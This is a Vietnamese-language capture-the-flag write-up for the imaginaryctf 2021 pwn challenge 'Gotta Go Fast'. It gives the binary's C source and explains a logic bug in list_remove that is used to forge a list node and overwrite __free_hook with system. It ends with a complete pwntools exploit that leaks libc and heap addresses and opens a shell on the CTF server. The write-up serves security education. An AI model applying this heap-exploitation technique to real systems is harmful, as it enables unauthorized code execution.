# Writeup imaginaryctf 2021
#   Author: shawking
> # Challenge Name : Gotta Go Fast
## File challenge:  [Gotta_Go_Fast](https://github.com/shawking2/Writeup/blob/main/2021/imaginaryctf/Gotta_Go_Fast/src/gotta_go_fast?raw=true)
### Phân tích file:
Các cơ chế bảo vệ:
```
checksec gotta_go_fast
[*] '/mnt/c/Users/19520/Music/Imaginary/Gotta/gotta_go_fast'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```
Bài này tác giả có cho source code:
```
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

typedef struct Tribute {
    char name[100];
    short district;
    short index_in_district;
} Tribute;

typedef struct TributeList {
    Tribute* tributes[100];
    struct TributeList* next;
    int in_use;
} TributeList;

TributeList* head;

int list_append(Tribute* t) {
    int offset = 0;
    TributeList* cur = head;
    while (cur->in_use == 100) {
        if (cur->next == NULL) {
            cur->next = malloc(sizeof(TributeList));
            cur->next->next = NULL;
            cur->next->in_use = 0;
        }
        offset += 100;
        cur = cur->next;
    }
    offset += cur->in_use;
    cur->tributes[cur->in_use++] = t;
    return offset;
}

void list_remove(int idx) {
    TributeList* last = head;
    while (last->next != NULL) {
        if (last->next->in_use == 0) {
            free(last->next);
            last->next = NULL;
            break;
        }
        last = last->next; //last = second
    }

    TributeList* cur = head;
    while ((cur->in_use == 100 && idx >= 100)) { // free_hook
        if (!cur->next) {
            abort();
        }
        cur = cur->next;
        idx -= 100;
    }
    Tribute* t = last->tributes[last->in_use - 1];  // one
    last->tributes[last->in_use - 1] = cur->tributes[idx];  // *free_hook
    free(last->tributes[last->in_use - 1]);
    cur->tributes[idx] = t;
    last->in_use--;
}

int readint(int lo, int hi) {
    int res = -1;
    while (1) {
        printf("> ");
        scanf("%d", &res);
        if (res >= lo && res <= hi) {
            return res;
        }
    }
}

void init() {
    head = malloc(sizeof(TributeList));
    head->next = NULL;
    head->in_use = 0;

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    alarm(180);
}

void menu() {
    puts("What would you like to do?");
    puts(" [0] Draft a new tribute");
    puts(" [1] Remove a tribute from the list (because someone volunteered in their place again, people should really stop doing that, it messes with our management system)");
    puts(" [2] See an overview of the current tributes");
    puts(" [3] Start the games, may the odds be ever in your favor!");
}

void draft() {
    Tribute* t = malloc(sizeof(Tribute));
    puts("For which district will this tribute fight?");
    t->district = readint(1, 12);
    puts("What's the position among the tributes for this district?");
    t->index_in_district = readint(1, 2);
    puts("Least importantly, what's their name?");
    scanf("%99s", t->name);

    printf("Noted, this is tribute %d\n", list_append(t));
}

void undraft() {
    puts("Which tribute should be undrafted?");
    int idx = readint(0, INT_MAX);
    list_remove(idx);
    puts("done.");
}

void list() {
    int idx = 0;
    TributeList* cur = head;
    while (cur) {
        for (int i = 0; i < cur->in_use; i++, idx++) {
            Tribute* t = cur->tributes[i];
            printf("Tribute %d [%s] fights in position %d for district %d.\n", idx, t->name, t->index_in_district, t->district);
        }
        cur = cur->next;
    }
}

void run() {
    puts("TODO: implement this simulation into the matrix.");
    exit(0);
}

int have_diagnosed = 0;
void diagnostics() {
    if (have_diagnosed) {
        puts("I understand things might be broken, but we should keep some semblance of security.");
        abort();
    }
    have_diagnosed = 1;
    puts("I take it the management system was ruined by volunteers again? Just let me know which memory address you need...");
    unsigned long long x = 0;
    scanf("%llu", &x);
    printf("%p\n", *(void**)x);
}

int main() {
    init();

    puts("Welcome to the Hunger Games management system.");

    while (1) {
        menu();
        int choice = readint(0, 4);
        switch (choice) {
            case 0:
                draft();
                break;
            case 1:
                undraft();
                break;
            case 2:
                list();
                break;
            case 3:
                run();
                break;
            case 4:
                diagnostics();
                break;
            default:
                abort(); // Shouldn't happen anyway
        }
    }
}
```
Vì có source code nên ta có thể thấy chức năng của các hàm khá rõ ràng nên mình sẽ không giải thích lại.

### Khai thác:
Ở bài này ta có thể sử dụng fastbin attack nhưng cách mình thì sẽ lợi dụng 1 số bug logic của file ko cần exploit bin. Các bạn có tham khảo cách fastbin attack của bạn pivik ở đây: https://pivikk.github.io/2021-07-27-imaginaryctf2021/. 

Tại hàm diagnostics ta sẽ leak dc libc base tại đây.

Tại hàm undraft ta có thể nhập 1 idx từ 0 ->  INT_MAX để free. Sau tại hàm list_remove sau khi free tại tributes[idx] ta chọn sau đó nó tiến hành hoán đổi vị trí ta vừa free với vị trị tương ứng tại tributes[in_use-1]. Mình sẽ lợi dùng điều này để tạo ra fake TributeList->next mà ta có thể nhập vào giá trị mà ta mong muốn. Tại fake TributeList mình sẽ cho Fake_TributeList->in_use = 100 , Fake_TributeList->next = &__free_hook,  Fake_Tribute->tributes[0] = system. Vậy khi ta gọi undraft bằng với idx = 100 tức vị trí của system, ta sẽ ghi dc địa chỉ của hàm system vào __free_hook

### Code exploit:
```
from pwn import *
import os 
import sys


LIBCSEVER = './libc6_2.23-0ubuntu11.2_amd64.so'
LIBCLOCAL = '/lib/x86_64-linux-gnu/libc.so.6'
BINARY = './gotta_go_fast'
HOST = "chal.imaginaryctf.org"
PORT = 42009



if sys.argv[1] == "1":
    p = process(BINARY)
    elf = ELF(BINARY)
    libc = ELF(LIBCLOCAL)
elif sys.argv[1] == "2":
    p = remote(HOST,PORT)
    elf = ELF(BINARY)
    libc = ELF(LIBCSEVER)
else:
    p = process(BINARY)
    elf = ELF(BINARY)
    libc = ELF(LIBCLOCAL)


def Draft(district, index_in_district, data):
    p.sendlineafter("> ", str(0))
    p.sendlineafter("> ",str(district))
    p.sendlineafter("> ",str(index_in_district))
    p.sendlineafter("Least importantly, what's their name?\n",data)
def UnDraft(idx):
    p.sendlineafter("> ", str(1))
    p.sendlineafter("> ",str(idx))
def List():
    p.sendlineafter("> ", str(2))
def Diagnostics(address):
    p.sendlineafter("> ", str(4))
    p.sendlineafter("let me know which memory address you need...\n",str(address))
    
def main():
    head = 0x602050
    got_puts = 0x601fb0
    Diagnostics(got_puts)
    puts = int(p.recvuntil("\n")[:-1], 16)
    log.success("got_puts: " + hex(puts))
    libc_base = puts - libc.symbols['puts']
    log.success("libc_base: " + hex(libc_base))
    free_hook = libc_base + libc.symbols['__free_hook']
    system = libc_base + libc.symbols['system']
    one = libc_base + 0xf03a4 
    log.success("one_gadget: " + hex(one))
    #temp = p64(one)
    
    offset = 0x64
    payload = p64(0)
    payload += b'A'*4
    Draft(1,1, payload)
    Draft(1,1, payload)
    Draft(1,1, payload)

    UnDraft(0x68)
    List() # off = 0x430
    p.recvuntil("Tribute 0 [")
    leak = u64(p.recvuntil("]")[:-1].ljust(8, b'\x00'))
    heap_base = leak - 0x430 
    log.success("heap_base: " + hex(heap_base))
    
    
    
    temp = p64(system)
    Draft(1,1, temp)
    Draft(1,1, payload)
    UnDraft(0)
    UnDraft(0x64)
    for i in range(4):
        Draft(1,1, payload)

    Draft(1,1, payload)
    Draft(1,1, payload)
    
    payload1 = b'/bin/sh\x00'
    payload1 += p64(system)
    payload1 += p64(free_hook)
    payload1 += p64(100)
    
    Draft(1,1, payload1)# no day
    Draft(1,1, payload)

    for i in range(80 + 10):
        print(i)
        Draft(1,1, payload)
    Draft(1,1, b'a')
    UnDraft(8)
    
    
    
    
    
    p.interactive()
if __name__ == '__main__':
    main()
```
![screenshot](https://github.com/shawking2/Writeup/blob/main/2021/imaginaryctf/Gotta_Go_Fast/img/Capture.PNG)



